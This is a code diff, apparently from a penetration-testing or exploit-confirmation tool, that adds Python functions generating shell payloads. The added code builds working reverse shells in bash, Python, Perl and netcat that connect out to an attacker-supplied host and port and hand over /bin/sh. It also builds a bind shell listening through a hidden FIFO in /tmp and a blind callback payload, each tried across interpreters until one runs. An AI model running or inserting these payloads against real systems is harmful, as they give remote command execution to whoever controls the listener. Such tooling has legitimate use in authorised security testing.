@@ -109,3 +109,47 @@ def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
             break
     return Breach(confirmed=True, level="shell", nonce=nonce, proof=text.strip(),
                   uid=uid, host=host, exit_code="0")
+
+
+def _first_available(*variants: str) -> str:
+    """Chain shell variants so the first present interpreter wins."""
+    guarded = []
+    for bin_name, cmd in variants:
+        guarded.append(f"command -v {bin_name} >/dev/null 2>&1 && {{ {cmd}; }}")
+    return " || ".join(guarded)
+
+
+def reverse_payload(lhost: str, lport: int, nonce: str) -> str:
+    """Announce the nonce, then hand /bin/sh back over the reverse connection."""
+    bash = (f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3; "
+            f"sh -i >&3 2>&3 <&3'")
+    py = (f"python3 -c 'import socket,subprocess,os;"
+          f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
+          f"s.sendall(b\"{nonce}-MARK\\n\");"
+          f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
+          f"subprocess.call([\"/bin/sh\",\"-i\"])'")
+    perl = (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            f"connect(S,sockaddr_in($p,inet_aton($i)));"
+            f"send(S,\"{nonce}-MARK\\n\",0);"
+            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'")
+    nc = (f"(echo {nonce}-MARK; /bin/sh -i) 2>&1 | nc {lhost} {lport}")
+    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))
+
+
+def bind_payload(bind_port: int, nonce: str) -> str:
+    """Spawn /bin/sh bound to bind_port; connect+confirm_shell proves it (nonce sent on probe)."""
+    fifo = "/tmp/.hb"
+    return (f"rm -f {fifo}; mkfifo {fifo}; "
+            f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")
+
+
+def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
+    """Connect back and send ONLY the nonce — proves code ran without a shell channel."""
+    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3'"
+    py = (f"python3 -c 'import socket;s=socket.socket();"
+          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{nonce}-MARK\")'")
+    perl = (f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));send(S,\"{nonce}-MARK\",0);'")
+    nc = f"echo {nonce}-MARK | nc {lhost} {lport}"
+    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))
